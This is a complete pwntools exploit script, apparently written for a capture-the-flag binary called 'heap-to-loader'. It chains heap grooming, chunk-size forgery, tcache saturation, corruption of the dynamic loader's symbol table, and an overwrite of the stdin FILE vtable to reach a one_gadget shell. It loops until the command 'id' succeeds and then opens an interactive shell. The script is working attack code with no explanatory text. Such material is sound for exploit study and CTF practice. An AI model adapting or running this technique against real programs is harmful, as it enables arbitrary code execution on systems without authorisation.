from pwn import *

context.binary = elf = ELF("heap-to-loader")
context.log_level = "info"

found = False
attempt = 1

while not found:
    try:
        log.info(f"Attempt: {attempt}")
        io = process("heap-to-loader")

        # -------------------------------------------------
        # Heap interaction primitives
        # -------------------------------------------------
        def heap_alloc(slot, size, data=b"A"):
            io.sendline(b"1")
            io.sendline(str(slot).encode())
            io.sendline(str(size).encode())
            io.sendline(data)

        def heap_byte_write(slot, offset, byte_hex):
            io.sendline(b"2")
            io.sendline(str(slot).encode())
            io.sendline(str(offset).encode())
            io.sendline(byte_hex)

        def heap_free(slot):
            io.sendline(b"3")
            io.sendline(str(slot).encode())

        # -------------------------------------------------
        # Derived libc-relative write primitive
        # -------------------------------------------------
        def libc_relative_write(anchor_slot, relative_offset, payload: bytes):
            for i, b in enumerate(payload):
                heap_byte_write(anchor_slot, relative_offset + i, f"{b:02x}".encode())

        # -------------------------------------------------
        # Phase 1 — Heap grooming and chunk size forgery
        # -------------------------------------------------
        for i in range(8):
            heap_alloc(i, 0x30)

        # Forge adjacent chunk size fields to 0x291
        for i in range(7):
            heap_byte_write(0, (i * 0x40) + 0x38, b"91")
            heap_byte_write(0, (i * 0x40) + 0x39, b"02")

        # -------------------------------------------------
        # Phase 2 — Tcache saturation
        # -------------------------------------------------
        for i in range(8):
            heap_free(i)

        # -------------------------------------------------
        # Phase 3 — Free heap base
        # -------------------------------------------------
        heap_free(-4)

        # Force unsorted bin allocation
        heap_alloc(0, 0x80, p16(1) * 4)

        # Allocation backed by libc arena structures
        heap_alloc(1, 0x30)

        # -------------------------------------------------
        # Phase 4 — Transition to loader metadata (ret2dso)
        # -------------------------------------------------
        ARENA_TO_STDIN_OFFSET     = -0x240
        STDIN_VTABLE_OFFSET       = 0xd8
        LINKMAP_SYMTAB_OFFSET     = 0xb60
        DSO_SYMBOL_OFFSET         = 0x208
        LD_WRITABLE_BASE_OFFSET   = 0x3a000

        ONE_GADGET_OFFSET         = 0x12ee1a
        LD_LIBC_DRIFT             = 0x1a8560

        forged_st_value = (
            -(LD_LIBC_DRIFT + ONE_GADGET_OFFSET)
            & 0xffffffffffffffff
        )

        forged_symbol = (
            p64(0x19) +                     # st_name (copied)
            p64(0xd001200000020) +          # metadata fields
            p64(forged_st_value)            # forged st_value
        )

        # Redirect DT_SYMTAB inside loader metadata
        target = (
            ARENA_TO_STDIN_OFFSET
            + LD_LIBC_DRIFT
            + LD_WRITABLE_BASE_OFFSET
            + LINKMAP_SYMTAB_OFFSET
        )
        libc_relative_write(1, target, b"\xf0")

        # Overwrite a concrete Elf64_Sym entry
        target = (
            ARENA_TO_STDIN_OFFSET
            + LD_LIBC_DRIFT
            + LD_WRITABLE_BASE_OFFSET
            + DSO_SYMBOL_OFFSET
        )
        libc_relative_write(1, target, forged_symbol)

        # -------------------------------------------------
        # Phase 5 — Trigger runtime resolution via FILE corruption
        # -------------------------------------------------
        target = ARENA_TO_STDIN_OFFSET + STDIN_VTABLE_OFFSET + 7
        libc_relative_write(1, target, b"\xff")

        io.sendline(b"id")
        if b"uid" in io.clean():
            found = True
            io.interactive()

    except Exception:
        io.close()
        attempt += 1